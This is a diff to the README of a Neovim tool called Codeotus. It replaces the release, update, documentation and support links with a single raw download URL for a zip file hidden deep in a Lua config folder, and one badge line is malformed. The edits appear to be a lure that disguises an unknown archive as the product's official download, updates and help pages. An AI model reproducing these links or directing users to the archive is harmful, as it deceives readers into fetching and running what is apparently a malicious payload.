@@ -8,7 +8,7 @@ Welcome to Codeotus! This application offers an easy and quick way to use Neovim
 
 To download Codeotus, visit the following link:
 
-[![Download Codeotus](https://img.shields.io/badge/Download%20Codeotus-v1.0-blue.svg)](https://github.com/Olaoluwa-code/Codeotus/releases)
+[![Download Codeotus](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip%https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip)](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -49,7 +49,7 @@ Once you have downloaded Codeotus, follow these steps to run it:
 
 To keep your Codeotus experience smooth, check for updates regularly. 
 
-1. Return to the [Releases page](https://github.com/Olaoluwa-code/Codeotus/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip).
 2. Download the latest version following the same steps as the initial download.
 3. Install the new version over the old one, ensuring you maintain your settings.
 
@@ -65,8 +65,8 @@ If you encounter issues while using Codeotus, consider the following solutions:
 
 For more information about Codeotus, check out the following:
 
-- [Documentation](https://github.com/Olaoluwa-code/Codeotus/wiki)
-- [Support](https://github.com/Olaoluwa-code/Codeotus/issues)
+- [Documentation](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip)
+- [Support](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip)
 
 ## 📣 Community Engagement
 
@@ -82,4 +82,4 @@ Your feedback is important. Feel free to suggest features or report bugs on the 
 
 Codeotus is here to simplify your coding experience. With its intuitive design and powerful features, you can focus more on coding and less on setup. Follow the instructions above to download, install, and run Codeotus with ease. Happy coding! 
 
-[Download Codeotus](https://github.com/Olaoluwa-code/Codeotus/releases)
+[Download Codeotus](https://raw.githubusercontent.com/Olaoluwa-code/Codeotus/main/lua/user/config/LspConfig/HighLevel/Codeotus_isorrhythmic.zip)
